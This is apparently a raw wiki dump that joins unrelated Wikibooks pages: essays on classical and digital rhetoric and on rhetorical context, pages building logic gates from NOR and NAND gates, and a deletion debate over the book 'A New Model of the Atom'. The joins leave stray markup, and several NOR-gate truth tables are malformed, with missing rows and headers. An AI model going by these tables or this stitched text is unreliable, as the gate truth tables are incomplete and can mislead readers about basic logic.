The [http://en.wikipedia.org/wiki/Sophism Sophists] claimed that all walks of knowledge were woven with rhetoric, because language itself is used to “construct a value-laden worldview&quot; (Bizzell and Hersberg 5). In order to understand how to master the true potential of persuasive language and strive to truth, one had to teach him or herself in many areas of knowledge and life. The Sophists believed that humans could not obtain absolute truth, but probable knowledge is possible by comparing opposing positions and examining all arguments. This challenged the idea of conveying one message when there are multiple truths to explore.

==What is Rhetoric?==

Today, rhetoric encompasses almost all &quot;forms of discourse and symbolic communication&quot; (Bizzell and Hersberg 2). Rhetoric has developed into &quot;situated, strategic discourse&quot; (Traci Zimmerman).  Strategic discourse, signifying the methodology of a writer's technique creates texts with specific [http://www.rpi.edu/dept/llc/webclass/web/project1/group4/ persuasive appeals], which origins can be traced back to Aristotle's rhetorical conventions. These main forms are defined as ethos, pathos, and logos. They are effective because the writer's message is able to solicit the reader's moral stance [http://rhetoric.byu.edu/persuasive%20appeals/Ethos.htm (ethos)], emotions [http://rhetoric.byu.edu/persuasive%20appeals/Pathos.htm (pathos)], and logic [http://rhetoric.byu.edu/persuasive%20appeals/Logos.htm (logos)]. The writer's choice of [http://rhetoric.byu.edu/Encompassing%20Terms/decorum.htm decorum] including voice, style, and use of cultural symbols all play a part in creating discourse. These rhetorical forms are instrumental in addressing the [http://rhetoric.byu.edu/Encompassing%20Terms/audience.htm audience], because &quot;rhetorical analysis always takes into account how an audience shapes the composition of a text or responds to it.&quot; 


The term situated places emphasis on the &quot;when&quot; of rhetoric, analyzing the audience of the moment and the relevant situation surrounding a topic, this is known as Kairos or the opportune moment. Stepping back from the direct relationship between the text and the audience, the text is also shaped by the social environment that it is situated in [http://rhetoric.byu.edu/Encompassing%20Terms/kairos.htm the occasion or Kairos]. The kairos of a text is derived from the writer's purpose for developing a message from their socio-economic or political environment. The kairos transforms the language given the context and the relevance of symbolic understanding by the targeted audience. Symbols are used as a tool to communicate through familiarity and association (Traci Zimmerman). Ann Swidler, author of &quot;Culture in Action: Symbols and Strategies&quot; in the ''American Sociological Review'' explains that within a culture, &quot;cultural practices such as language, gossip, stories, and rituals of daily life&quot;  are symbolic means to express particular behaviors or views with each other&quot; (273). Thus, the writer's methodology, audience, and occasion are all strategically constructed to convey the writer's message during discourse.


Postmodern writers are not necessarily “learned in philosophy, history, law, literature, and other fields of study” stressed by classical Greek orators, but have greater flexibility to specialize in a particular field (Bizzell and Hersberg). In some way, shape, or form we are all rhetoricians, manipulating the texts around us, tailoring them to persuade or evoke change in an audience.

==Introducing Digital Rhetoric==

Our definition of digital rhetoric is similar to the classical rhetoric of ancient Greece and Rome. Today, rhetoric still conveys information and persuades readers or an audience to act or think a certain way. However, digital rhetoric uses the technologies of new media such as the Web, blogs, Websites, video games, forums, video, audio, PowerPoint, e-mail, wikis, and photoshopped images to construct messages, not just oration ([http://www.digitalrhetoric.org/what3.html/ Elizabeth Losh]). As a result, these genres developed new practices for structuring and conveying discourse (e.g. [http://www.webstyleguide.com/?/contents.html/ web style guides] or [http://www.studygs.net/netiquette.htm/ guides to netiquette]). The development of new mediums has changed the way we apply rhetorical practices to texts. 


As technology advances, so do the ways people communicate and interact with each other. Classical rhetoric originated as a dominant force in public affairs and education. Today, digital rhetoric is prominent in our politics, schools, religions, and homes. This phenomenon is still present but it is the way we create and convey information that has evolved. The two main differences between electronic texts and persuasion compared to traditional texts and persuasion is technology and access. New technologies offer new ways of presenting information, opinions, and ideas. Then, as new technologies become popular the public (you and me) gains access to information and other people’s opinions and ideas. Increased access to information leads to new knowledge, skills, and creativity. Unfortunately, the [http://www.digitaldivide.org/dd/index.html digital divide], &quot;the gap between those who benefit from digital technology and those who do not,&quot; prevents many from accessing and participating in the devices of digital rhetoric.


In ''Looking to the Future: Electronic Texts and the Deepening Interface'', Barbara Warnick asks &quot;How can rhetoricians adapt to the new rhetoric of technology?&quot; (329) Warnick explains that &quot;the implications of new media forms apply in at least two areas of rhetorical practice--production and criticism&quot; (329). Creators of electronic texts are concerned with &quot;audience appeal&quot; which in return leads to &quot;market success&quot; (329). On the other hand, critics of electronic texts have the opportunity to &quot;consider how these producers have exploited the affordances of new media for rhetorical purposes&quot; (329). Thus, the rhetorical practice of analyzing audience, purpose, and occasion of a text still occurs but through new mediums. 


The old cannons of rhetoric such as invention, arrangement, and style are present in [http://kairos.technorhetoric.net/11.3/binder.html?topoi/prior-et-al/index.html electronic texts], while the practice of memory and delivery have faded with the emergence of new mediums for communication. Electronic texts are visual documents that can be referenced at any time; therefore, there is no need to memorize the information or text. In addition, classical rhetoric may not be able to determine a specific audience for an electronic text. These texts do not always reach their intended audiences and may attract unfamiliar and diverse audiences. The [http://www.readwriteweb.com/archives/evolution_of_communication.php evolution of communication] has revolutionized the way we convey ideas to others.
 

Rhetoric is everywhere; it is the driving force under everything we do to persuade or manipulate an audience. James Zappen in ''Digital Rhetoric: Towards an Integrated Theory'' explains that communication in digital spaces not only persuades by &quot;moving audiences to action or belief, but also self-expression for the purpose of exploring individual and group identities and participation and creative collaboration for the purpose of building communities of shared interest&quot; (322). These communities of shared interest represent the public sphere. The public sphere can be defined by the breadth of people who have access to public discourse. The expansiveness of the sphere can be as large as a major network broadcasting company or as small as a town council meeting. Jürgen Habermas an authoritative figure on the public sphere, examines &quot;communicative action&quot; [http://books.google.com/books?id=ony4OvrPa9wC&amp;dq=J%C3%BCrgen+Habermas&amp;printsec=frontcover&amp;source=bl&amp;ots=BsXy2vCQCt&amp;sig=ut7zIgs1aQ_1UQ3LPGYIljYDoWI&amp;hl=en&amp;ei=1Y3bScywNIfflQexyNCCCA&amp;sa=X&amp;oi=book_result&amp;ct=result&amp;resnum=6#PPP1,M1 (18)] situated within discourse in different &quot;social systems&quot; [http://books.google.com/books?id=ony4OvrPa9wC&amp;dq=J%C3%BCrgen+Habermas&amp;printsec=frontcover&amp;source=bl&amp;ots=BsXy2vCQCt&amp;sig=ut7zIgs1aQ_1UQ3LPGYIljYDoWI&amp;hl=en&amp;ei=1Y3bScywNIfflQexyNCCCA&amp;sa=X&amp;oi=book_result&amp;ct=result&amp;resnum=6#PPP1,M1 (19)] as progressing systems that are linking together more and more.  


These new mediums create limitless access points for more individuals to voice their opinions and challenge the mainstream thought. Thus, as more people begin to have a voice, the public sphere is less likely to present a united, clear message.

==Digital Rhetoric: Changing the Way We Read and Write==

With new technologies and increased access, emerges the question of [http://en.wikibooks.org/wiki/Digital_Rhetoric/Authorship authorship]. In “Who is the author?” Barthes (“The Author is Dead”) explored the issue of authorship by giving the power to understand and interpret texts to the reader. He speaks of a text’s author as its origin and the reader of a text as its destination. Barthes explains that the destination is where the text comes to life (so to say) under the culture and experiences of the reader. But Barthes could not have imagined a World Wide Web, where the lines between author and reader are barely visible. Today’s question of authorship deals with intellectual property right laws, the rights of authors to distribute, sell, and provide permission for use of their works. New media brings new challenges to the current laws and regulations regarding copyright law. This leads to the progressive ideas of Lawrence Lessig, who seeks change in legislation regarding intellectual property right laws to preserve creativity with new media.


In ''Free Culture'', Lessig writes, “Just at the time digital technology could unleash an extraordinary range of commercial and noncommercial creativity, the law burdens this creativity with insanely complex and vague rules and with the threat of obscenely severe penalties” (19). As new media’s emerge, more and more people will have the opportunity to be creative and be inspired by other people’s work. For us to move forward as a creative society, we need to update and change our laws regarding intellectual property law. In addition to updating our laws, we need to educate the public about these laws as to what they entail and what are the consequences for breaking the laws.

      <text xml:space="preserve">==Introduction==

The context of rhetoric has evolved dramatically from traditional to digital rhetoric.  Rhetoric began as speech primarily for political or public purposes. The digital arena has morphed rhetoric into a malleable forum that blurs the line between [http://en.wikibooks.org/wiki/Authorship author]and reader, that allows the author to convey a message in one way, and leaves open the possibility for the audience to absorb, interpret, and interact with the message. Rhetoric has survived in the digital world by adapting to the new contexts of [http://en.wikibooks.org/wiki/Genres_and_Media audio, visual, text] and [http://en.wikibooks.org/wiki/Remediation_and_remix remix] that web 2.0 has allowed.

==What is context?==

According to [http://www.merriam-webster.com/dictionary/context Merriam-Webster], context is the parts of a discourse that surround a word or passage and help to explain it's meaning.  In other words, context is the situation, which has a direct or indirect effect on the message, content, and overall purpose of a rhetorical situation and the discourse contained within that situation.  
The importance of context in rhetoric, especially digital rhetoric is that it has the potential to completely change or even slightly alter the purpose of discourse. Ideally, context is always changing, therefore the idea of context is forever changing how discourse is presented, received and understood.  Walter Ong, for example, has pointed out that “the revolution of the digital era is the continuation of a tradition begun many centuries ago, in which the organization of signs used in social life into words, not only written but also spoken, and images, had become devices for the mobilization of ideas&quot; (Tapia, 8) 

==New Approaches to Rhetoric==

In [http://books.google.com/books?id=JaC1zf8D9oIC&amp;printsec=frontcover&amp;dq=new+approaches+to+rhetoric New Approaches to Rhetoric]  by Patricia A. Sullivan and Steven R. Goldzwig, they discuss situations in which rhetoric can be applied effectively.  Their untraditional rhetorical contexts allow us to look at rhetoric outside of scholarly settings and outside the conventional world of argument and persuasion.  One context they talk about is the presence of rhetoric in the Human Genome Diversity Project (not to be confused with the Human Genome Project).  The HGDP is a group of scientists whose main goal is to map the DNA between humans that vary less than 1%.   The scientific situation of this context has allowed for discourse to appear, involving issues such as debating the rights of the target group of people and determining the legal and ethical areas this study would be effective.  The book goes on to suggest different forms of rhetoric, including rhetoric during the civil rights movement and rhetorics  during the cold war.

==Rhetoric in Different Contexts==

Web 1.0:  Web 1.0 is the context that consists in the symbolic cyber space in which everything is static.  Nothing changes, there is no interactivity, and it’s just a giant arena for a plethora of information.  While it is true that rhetoric can exist in this context, the digital rhetoric that we focus on is going to be most effective and most beneficial in the web 2.0 context.

Web 2.0:  Web 2.0 has gone to the next level by taking the information that can be found all over the web, and has changed and adapted it to fit with the digital rhetoric that is developing.  Web 2.0 now allows for more interaction and control by the user, and has blurred the line between reality and cyberspace.  When referring directly to digital rhetoric, web 2.0 has opened the playing field for the user to now control the context, and the audience to now control the message.  While there are still [http://en.wikibooks.org/wiki/Authorship author] and creators, the line between them and the audience has been dramatically changed and projects involving remixing and remediation have allowed for more control from the other side of the line in cyber space.

Web 3.0:  It’s true that web 3.0 has yet to be defined and classified as a new form of web media.  However, we can be sure that rhetoric, especially the interactivity and development of digital rhetoric will survive and ultimately prosper in this new context.

==The Rhetorical Situation==

In [http://books.google.com/books?id=y8DQbejpye4C&amp;pg=PP1&amp;dq=contemporary+rhetorical+theory Contemporary Rhetorical Theory] they address the importance of the rhetorical situation, including elements such as audience, speaker, subject, occasion and speech.  They focus on the importance of a situation in relation to rhetorical discourse but make very clear that the situation doesn't exist because of the discourse.  The situation or the context itself calls up the discourse, and that a certain work is rhetorical because of the situation it is in.  They say, &quot; ...a work of rhetoric is pragmatic; it comes into existence for the sake of something beyond itself; it functions ultimately to produce action or change in the world; it performs some task.&quot;

We can't generalize rhetoric by saying that it's created in effect change, but that a &quot;particular discourse comes into existence because of some specific condition or situation which invites utterance.&quot;    This challenges our previously ideas that rhetoric exists because something needs to be changed, but that the rhetorical situations are in fact contexts that call for rhetoric.  

A rhetorical situation contains three main elements that allow it to function as a rhetorical context.  Exigence, audience, and constraints.  An exigence is simply defined as an obstacle or something to be done, and comes about of necessity and cannot be changed but can becoming rhetorical when the modification requires or can be assisted by discourse.  The one exigence of a rhetorical situation that cannot be changed but has the most impact on the situation is audience.  A rhetorical audience &quot;consists of only those persons who are capable of being influenced by discourse and can mediators of change&quot; (pg 221).  Constraints are events, persons, and objects that keep the decision or action to modify the exigence from happening.  These include, but are not limited to, beliefs attitudes, documents, facts, images, motives, etc.  All of these will influence the change the message is trying to invoke within the rhetorical situation.

In a perfect world, exigencies would not exist, we would all get along, and there would be no need for rhetorical discourses or situations.  But the world invites change and &quot;creates&quot; situations in which discourse can appear to inflict that change.  Thus, rhetoric is separated from the &quot;craft of persuasion&quot; because it does include more elements than merely presenting a message in hopes to invoke change.  It requires investigation, motivation, and presentation.

==Context and Interpretation==

The rhetoric of  focuses on [http://en.wikibooks.org/wiki/Hypertexts_and_Hyperlinks hypertext] and how it has changed and reorganized how we read and interpret content. In  [http://www.mitpressjournals.org/doi/abs/10.1162/074793603762667665 Graphic Design in the Digital Era: The Rhetoric of Hypertext], an article by Alejandro Tapia appeared in Design Issues in the winter issue of 2003, there are several great ideas throughout the article regarding rhetoric and how is it has evolved but remained in its original state. 

One idea mentioned right off the bat is that grammar is an expression and form to &quot;regulate our interpretation as we read&quot;(1). While context specifically was never specifically addressed it was stressed throughout the article as having a huge effect on how information is portrayed, for instance, &quot;On a digital soundtrack, for example, a tone of voice easily can be modified or mixed with another. A photograph can be altered by manipulation of pixels, and its traditional referral procedure can be substituted by electronic randomness&quot; (6). Thanks to new technologies such as Photoshop and iMovie anyone with access to a computer has the ability to alter the context of a work; whether it be text, hypertext, video, audio, and/or a visual.

Another concept that is stressed is the idea that as readers we need to look at the content as a whole. Classically we have learned to read linearly but now with the ability to hypertext we are able to recreate the structure of the material we are trying to convey. What does this mean? This means that as a reader we can actively jump from one topic to another freely without being forced to read about a topic in a chronological order from start to finish; instead we can jump from one area to another to read the middle before reading the beginning or the end. Tapia explains this in a far better way than I could, “In classic theories of [http://en.wikibooks.org/wiki/Hypertexts_and_Hyperlinks hypertext], such as Bolster’s or Neilson’s, it also was said that the novel possibility of thinking in complex and multiple structures, with different ways of approaching the text available to the reader, nonlinear process which were better than the old ‘surpassed’ linear systems, and with textual systems than have no beginning, middle or end, was quite unheard of, and that one now must think in terms of interconnectivity and multi-order rather than consecutiveness and hierarchies” (7). 

Throughout this semester we have discussed the concepts of web 1.0, 2.0, and what the next phase will be, web 3.0. Tapia gives insight to the value of rhetoric and the different forms it has taken and where it might go. He cites a study on hypertext which states, &quot;Both forms can continue to coexist since, although there are those who argue that multimedia and interactivity alone will survive into the future, the writer believes that pure text also will have a place while there are still those who have something to say in this form&quot; and that the possibilities of nonlinear literary writing have yet to be explored&quot; (9). The concept of [http://en.wikibooks.org/wiki/Hypertexts_and_Hyperlinks hypertext] and linking ideas from one page on a website to another that might explain that specific idea further is a perfect example of how web 2.0 allows people to interact with the web and in many ways points to where web 3.0 will go when it finally happens. Web 3.0 is not a matter of if it will happen but when.

      <text xml:space="preserve">[[Image:NOR ANSI Labelled.svg|thumb|A single NOR gate]]
Like [[Digital Circuits/NAND gate|NAND gates]], [[Digital Circuits/NOR gate|NOR gates]] are so-called &quot;universal gates&quot; that can be combined to form any other kind of [[Digital Circuits/Gates|logic gate]]. For example, the, [[:w:Apollo Guidance Computer|Apollo Guidance Computer]], was built exclusively from NOR gates, about 5,600 in total for the later versions. Today, contrary to popular belief, integrated circuits are not constructed exclusively from a single type of gate. Instead, [[:w:Electronic design automation|EDA]] tools are used to convert the description of a logical circuit to a netlist of complex gates ([[:w:standard cell|standard cell]]s) or transistors ([[:w:full custom|full custom]] approach).

== [[Digital Circuits/NOR gate|NOR]] ==

A NOR gate is trivially made:

{| align=center style=&quot;text-align:center&quot;
!width=150|Desired Gate!!width=150|NOR Construction
|-
|[[Image:NOR ANSI Labelled.svg]]||[[Image:NOR ANSI Labelled.svg]]

|- 
| 0 || 1 ||  || 0
|-
| 1 || 0 ||  || 0
|-
| 1 || 1 ||  || 0
|}
|}

== [[Digital Circuits/NOT gate|NOT]] ==

This is made by joining the inputs of a NOR gate. As a NOR gate is equivalent to an OR gate leading to NOT gate, this automatically sees to the &quot;OR&quot; part of the NOR gate, eliminating it from consideration and leaving only the NOT part.

{| align=center style=&quot;text-align:center&quot;
!width=150|Desired Gate!!width=150|NOR Construction
|-
|[[Image:NOT ANSI Labelled.svg]]||[[Image:NOT from NOR.svg]]

|+Truth Table
! Input A !!  !! Output Q
|-
| 0 || || 1
|- 
| 1 || || 0
|}
|}

== [[Digital Circuits/OR gate|OR]] ==

The OR gate is simply a NOR gate followed by a NOT gate.

{| align=center style=&quot;text-align:center&quot;
!width=150|Desired Gate!!width=150|NOR Construction
|-
|[[Image:OR ANSI Labelled.svg]]||[[Image:OR from NOR.svg]]

|colspan=2 align=center|
{| class='wikitable' style=&quot;text-align:center&quot; align=center

|- 
| 0 || 1 ||  || 1
|-
| 1 || 0 ||  || 1
|-
| 1 || 1 ||  || 1
|}
|}

== [[Digital Circuits/AND gate|AND]] ==

An AND gate gives a 1 output when both inputs are 1; a NOR gate gate gives a 1 output only when both inputs are 0. Therefore, an AND gate is made by inverting the inputs to a NOR gate.

{| align=center style=&quot;text-align:center&quot;
!width=150|Desired Gate!!width=150|NOR Construction
|-
|[[Image:AND ANSI Labelled.svg]]||[[Image:AND from NOR.svg]]

|colspan=2 align=center|
{| class='wikitable' style=&quot;text-align:center&quot; align=center

| 0 || 0 ||  || 0
|- 
| 0 || 1 ||  || 0
|-
| 1 || 0 ||  || 0
|-
| 1 || 1 ||  || 1
|}
|}

== [[Digital Circuits/NAND gate|NAND]] ==

A NAND gate is made using an AND gate in series with a NOT gate:

{| align=center style=&quot;text-align:center&quot;
!width=150|Desired Gate!!width=150|NOR Construction
|-
|[[Image:NAND ANSI Labelled.svg]]||[[Image:NAND from NOR.svg]]

|-
| 0 || 0 ||  || 1
|- 
| 0 || 1 ||  || 1
|-
| 1 || 0 ||  || 1
|-
| 1 || 1 ||  || 0
|}
|}

== [[Digital Circuits/XOR gate|XOR]] ==

An XOR gate is made by connecting the output of 3 NOR gates (connected as an AND gate) and the output of a NOR gate to the respective inputs of a NOR gate. This expresses the logical fomula (A AND B) NOR (A NOR B). This construction entails a propagation delay three times that of a single NOR gate.

{| align=center style=&quot;text-align:center&quot;
!width=150|Desired Gate!!width=150|NOR Construction
|-
|[[Image:XOR ANSI Labelled.svg]]||[[Image:XOR from NOR.svg]]

|- 
| 0 || 1 ||  || 1
|-
| 1 || 0 ||  || 1
|-
| 1 || 1 ||  || 0
|}
|}

Alternatively, the 4-gate version of the XNOR gate can be used with an inverter. This construction has a propagation delay four times that of a single NOR gate, but uses the same number of gates.

|-
|[[Image:XOR ANSI Labelled.svg]]||[[Image:XOR from NOR 2.svg]]
|}

== [[Digital Circuits/XNOR gate|XNOR]] ==

An XNOR gate can be constructed from four NOR gates implementing the expression &quot;(A NOR N) NOR (B NOR N) where N = A NOR B&quot;.

{| align=center style=&quot;text-align:center&quot;
!width=150|Desired Gate!!width=150|NOR Construction

|- 
| 0 || 1 ||  || 0
|-
| 1 || 0 ||  || 0
|-
| 1 || 1 ||  || 1
|}
|}

Alternatively, the 5-gate version of the XOR gate can be used with an inverter. This construction has a propagation delay four times that of a single NOR gate, and uses more gates.

      <text xml:space="preserve">[[Image:NAND ANSI Labelled.svg|thumb|A single NAND gate]]
Like [[Digital Circuits/NOR gate|NOR gates]], [[Digital Circuits/NAND gate|NAND gates]] are so-called &quot;universal gates&quot; that can be combined to form any other kind of [[Digital Circuits/Gates|logic gate]]. Today, integrated circuits are not constructed exclusively from a single type of gate. Instead, [[:w:Electronic design automation|EDA]] tools are used to convert the description of a logical circuit to a netlist of complex gates ([[:w:standard cell|standard cell]]s) or transistors ([[:w:full custom|full custom]] approach)

== [[Digital Circuits/NAND gate|NAND]] ==

This is a '''NAND''' gate: trivially, just a NAND gate is used to realise it:

{| align=center style=&quot;text-align:center&quot;
!width=150|Desired Gate!!width=150|NAND Construction
|-
|[[Image:NAND ANSI Labelled.svg]]||[[Image:NAND ANSI.svg]]
|-
|colspan=2 align=center|
{{truthtable2|A|B|Q|1|1|1|0}}
|}

== [[Digital Circuits/NOT gate|NOT]] ==

A NOT gate is made by joining the inputs of a NAND gate. Since a NAND gate is equivalent to an AND gate followed by a NOT gate, joining the inputs of a NAND gate leaves only the NOT part.

{| align=center style=&quot;text-align:center&quot;
!width=150|Desired Gate!!width=150|NAND Construction
|-
|[[Image:NOT ANSI Labelled.svg]]||[[Image:NOT from NAND.svg]]
|-
|colspan=2 align=center|
{{truthtable1|A|Q|1|0}}
|}

== [[Digital Circuits/AND gate|AND]] ==

An AND gate is made by following a NAND gate by a NOT gate as shown below. This gives a NOT NAND, i.e. AND.

{| align=center style=&quot;text-align:center&quot;
!width=150|Desired Gate!!width=150|NAND Construction
|-
|[[Image:AND ANSI Labelled.svg]]||[[Image:AND from NAND.svg]]
|-
|colspan=2 align=center|
{{truthtable2|A|B|Q|0|0|0|1}}
|}

== [[Digital Circuits/OR gate|OR]] ==

If the truth table for a NAND gate is examined, it can be seen that if any of the inputs are 0, then the output will be 1. However to be an OR gate, if any input is 1, the output must also be 1. Therefore, if the inputs are inverted, any high input will trigger a high output.

{| align=center style=&quot;text-align:center&quot;
!width=150|Desired Gate!!width=150|NAND Construction
|-
|[[Image:OR ANSI Labelled.svg]]||[[Image:OR from NAND.svg]]
|-
|colspan=2 align=center|
{{truthtable2|A|B|Q|0|1|1|1}}
|}

== [[Digital Circuits/NOR gate|NOR]] ==

A NOR gate is simply an OR gate with an inverted output:

{| align=center style=&quot;text-align:center&quot;
!width=150|Desired Gate!!width=150|NAND Construction
|-
|[[Image:NOR ANSI Labelled.svg]]||[[Image:NOR from NAND.svg]]
|-
|colspan=2 align=center|
{{truthtable2|A|B|Q|1|0|0|0}}
|}

== [[Digital Circuits/XOR gate|XOR]] ==

An XOR gate is constructed similarly to an OR gate, except with an additional NAND gate inserted such that if both inputs are high, the inputs to the final NAND gate will also be high, and the output will be low. This effectively represents the formula (A OR B) AND (A NAND B).

|-
|[[Image:XOR ANSI Labelled.svg]]||[[Image:XOR from NAND.svg]]
|-
|colspan=2 align=center|
{{truthtable2|A|B|Q|0|1|1|0}}
|}

== [[Digital Circuits/XNOR gate|XNOR]] ==

An XNOR gate is simply an XOR gate with an inverted output:

{| align=center style=&quot;text-align:center&quot;
!width=150|Desired Gate!!width=150|NAND Construction
|-
|[[Image:XNOR ANSI Labelled.svg]]||[[Image:XNOR from NAND.svg]]

: {{keep}} &gt;It seems silly to delete a novel approach, new concept or idea just because one finds some fault with it.  I say collaborate, build upon the initial design and make it better.  Much in science is accomplished this way.  How does one delete an &quot;idea&quot; anyway?
:{{keep}}, It seems to me that an instructional book on how to follow / understand standards would be within the bounds of Wikibook's inclusion criteria. [[User:Mattb112885|Mattb112885]] &lt;small&gt; ([[User talk:Mattb112885|talk to me]]) &lt;/small&gt; 00:16, 9 April 2009 (UTC)

I raised issues with this book a short while ago on the [[Talk:A New Model of the Atom|talk page]] after making [http://en.wikibooks.org/w/index.php?title=A_New_Model_of_the_Atom&amp;diff=1432215&amp;oldid=1396737 a few edits] and reading it through thoroughly. This book is fundamentally original research in that th analogies it draws are intended to not just visualise the effects of theories, but to replace them (though if only partially) with predictive power. There is, however, no description of how they should be applied or their limitations. Some (e.g. the gossamer nature of the atom, and the disk analogy for light) are inaccurate enough not to describe many of the nuances of physical interactions and using them literally (which, to some extent, is the very purpose of an analogy) quickly leads readers to draw unsubstantiated conclusions.

I believe that a book on visualising the atom would be a great addition to wikibooks, and would be happy to start and/or contribute to one if there is interest. Little would be left behind were we to weed out the problematic parts of this boo, and I feel that starting anew would serve us better than replacing the lacking content of this book and renaming it.

: [[Image:Symbol delete vote.svg|15px]] '''Delete''' --[[User:Swift|Swift]] ([[User talk:Swift|talk]]) 04:32, 27 March 2009 (UTC)

: [[Image:Symbol keep vote.svg|15px]] '''Keep''' - Certainly this book has it's limitations but that is no reason to delete it. I don't think that we can seriously qualify this as original research; the fact that the model has some predictive power is no indication of original research: any reasonable model for educational purposes needs some predictive power, otherwise the model wouldn't be good for anything. Probably someone can come up with a better book about atoms but that is also no reason to delete this one since we can have many books about atomic models. If we want authors to try new things and ideas here and help them collectively to come up with something useful for a large audience, then we should definitely keep this book. --[[User:Martin Kraus|Martin Kraus]] ([[User talk:Martin Kraus|talk]]) 09:30, 27 March 2009 (UTC)
:: Each of [http://en.wikibooks.org/w/index.php?title=A_New_Model_of_the_Atom&amp;diff=1432215&amp;oldid=1396737 the paragraphs I removed] (same link as above) are blatant original research. I have nothing against multiple books with different approaches or audiences, but something which goes against all accepted models of science is something we should not embrace. The original thought lies too deep in this book. Those contributing may wish to review the page [http://en.wikibooks.org/w/index.php?title=A_New_Model_of_the_Atom&amp;oldid=1396737 before my edits]. Wikibooks are a fine platform for new ways for presenting ideas &amp;mdash; not a platform for new ideas. --[[User:Swift|Swift]] ([[User talk:Swift|talk]]) 16:53, 27 March 2009 (UTC)
:::Oh, sorry, I was refering to &quot;new ideas for teaching something&quot;. And I thought the only version that was relevant for this dicussion would be the version as of March 27, 2009 but apparently this is not the case. --[[User:Martin Kraus|Martin Kraus]] ([[User talk:Martin Kraus|talk]]) 17:57, 27 March 2009 (UTC)

:::By the way, as far as I understand it, the basic idea of this model is somewhat similar to the [[w:Bohm interpretation|Bohm interpretation]] of quantum mechanics. I.e., the idea of thinking of the electron as a very quickly moving classical particle is neither new nor against science. --[[User:Martin Kraus|Martin Kraus]] ([[User talk:Martin Kraus|talk]]) 19:20, 27 March 2009 (UTC)

: {{keep}} I agree that (a) the book is very incomplete, and needs more description on the limitations on the models. I agree that (b) it is quite possible that you could do a better job writing from scratch a book on visualizing the atom. I agree that (c) the idea of a &quot;spinning disk&quot; for photons seems to conflict with the classical &quot;point-like&quot; model. I agree that (d) the models in this book are not completely accurate. However, (a) &quot;incomplete, poorly-written first drafts ... should also be encouraged.&quot; -- [[Wikibooks:Editing guideline]]. (b) Go ahead and start a new &quot;from scratch&quot; book on visualizing the atom now. The existence of this book doesn't stop you. (c) A &quot;spinning disk&quot; isn't that much different from the &quot;rotating clock hands&quot; of &quot;[[Wikipedia:QED: The Strange Theory of Light and Matter|QED: The Strange Theory of Light and Matter]]&quot; (1985). (d) I've never seen a completely accurate model of the atom -- even the standard model [[Wikipedia: standard model#Challenges to the standard model | has problems with gravity]]. --[[User:DavidCary|DavidCary]] ([[User talk:DavidCary|talk]]) 21:15, 29 March 2009 (UTC)

: {{keep}} &gt; I do plan writing more to [[:A New Model of the Atom]], but not until this voting is complete. 

:: Today, serendipitously, a young man (20-22 years) dropped in to repair my cable connection. I asked he him if had taken any science classes and was informed that he had 1 year each of science and physics. I asked if he understood how atoms work and form molecules. He said &quot;Uh, no... it's all very fuzzy to me. I didn't get much out of that subject&quot;. I showed him my WikiBook and he became elated. He had been leaning on my desk as I went through the various analogies. When done he stood and, looking me straight in the eyes, exclaimed exuberantly, &quot;In 10 minuets you have added more to my understanding of atoms and light than a whole year of classroom teaching. You should be a teacher!. I can't wait to show this to my brother&quot;! 

:: During our discussion he indicated that the &quot;'''model'''&quot; (his word choice) he was taught was the classical one shown in my book [[:File:Fig3AB iCarbon 01C.jpg]]. Whoever taught him science/physics, did so no more than 4 or 5 years ago, yet still used the old, drab and boring &quot;'''model'''&quot;. &quot;'''Model'''&quot; in this sense is only a word to indicate a device used as a teaching aid. Can we agree that this is &quot;A '''New Model''' of the Atom&quot; and not &quot;A '''New Standard Model''' of the Atom&quot;. I believe that omitting &quot;'''Model'''&quot; from the title, impedes searchers of &quot;'''models'''&quot; of &quot;atoms&quot; from finding this useful book. If my descriptions can inspire young people to look deeper into science then it would be a shame to make it difficult to find.

: {{keep}} &gt;As a Junior in college who has failed chemistry TWICE now, I have found this document to be extremely useful! A friend told me to try wikibooks to get a better understanding of the chemistry concepts that I couldn't grasp and I passed my third time around (with a B+!!!). Since then I have referenced all my friends and anyone I know who is struggling with chemistry to this site and I have only to receiver positive feedback.

:: To the &quot;both&quot; of you and Pcfjr9:  The problem is not the usefulness of the book.  It does have some useful explanations.  The problem is the fact that it may contain original research.  Wikibooks can only contain textbooks that explain topics that have been established with outside research.  See [[WB:OR]]. -- [[User:NipplesMeCool|NipplesMeCool]] ([[User talk:NipplesMeCool|talk]]) 23:46, 8 April 2009 (UTC)

: {{comment}} I see some potential in this book.  At this moment, I would vote &quot;DELETE&quot; because the book definitely has some original research in it.  Even a &quot;synthesis&quot; paper is considered original research, so it's not enough to say that your ideas are simply a collection and re-explanation of other people's ideas.  The book needs to cite sources very clearly because the analogies blur the line between the well-established scientific theories and original research.  For example, you should explain Schrodinger's Equation, then mention the analogy of a bullet hitting a propeller.  Then I would say &quot;KEEP&quot; because the book would clearly be a teaching tool for well-established theories. [[User:NipplesMeCool|NipplesMeCool]] ([[User talk:NipplesMeCool|talk]]) 00:04, 9 April 2009 (UTC)

: [[Image:Symbol comment vote.svg|15px]] '''Comment''' Missing information sounds like a reason to expand books and not a reason to delete them. Explaining the limitations of the analogies might not make sense depending on the intended audience of the book. Beginners or amateurs might not need to understand or know what the limitations are if all they want to know is the general idea. Intermediate or advanced learners might not need to have the limitations explained if they are already aware of the possible limitations of any analogy. The intended audience and goals of the book should be considered. Not every book needs to explain in detail the flaws of the analogies used. Someone could start a companion book like &quot;An annotated guide to the new model of the atom&quot; to analyst the flaws in the analogs used, if they feel so inclined. --&lt;span style=&quot;font: bold 10pt 'courier new', comic, sans, ms;&quot;&gt;[[User:Darklama|&lt;font color=&quot;midnightblue&quot;&gt;dark&lt;/font&gt;]][[User_talk:Darklama|&lt;font color=&quot;green&quot;&gt;lama&lt;/font&gt;]]&lt;/span&gt; 00:24, 9 April 2009 (UTC)

: {{keep}} &gt;I see no reason to delete this book.  The re-thinking and re-explanation of the atomic model is much more understandable to non-physics-philes like me.  As a rock hound and gem hobbyist, I particularly appreciate it's potential for explaining crystalline structures. If there's some doubt about the value of other components of the work, i.e. &quot;the gossamer nature of the atom, and the disk analogy for light&quot;, perhaps the author can extract these and expand them into separate pieces.  After all, isn't the lack of update and revision of thought for the atomic model the reason this re-thinking is long overdue? &lt;small&gt;&lt;span class=&quot;autosigned&quot;&gt;—Preceding [[w:Wikipedia:Signatures|unsigned]] comment added by [[User:66.32.231.57|66.32.231.57]] ([[User talk:66.32.231.57|discuss]] • [[Special:Contributions/66.32.231.57|contribs]]) 13:12, 9 April 2009&lt;/span&gt;&lt;/small&gt;

